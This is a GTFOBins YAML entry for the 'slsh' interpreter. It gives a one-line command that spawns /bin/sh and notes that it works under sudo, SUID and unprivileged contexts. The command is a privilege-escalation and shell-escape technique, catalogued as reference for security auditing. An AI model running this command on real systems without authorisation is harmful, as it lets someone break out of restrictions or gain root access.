<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/slsh -->
---
functions:
  shell:
  - code: |-
      slsh -e 'system("/bin/sh")'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
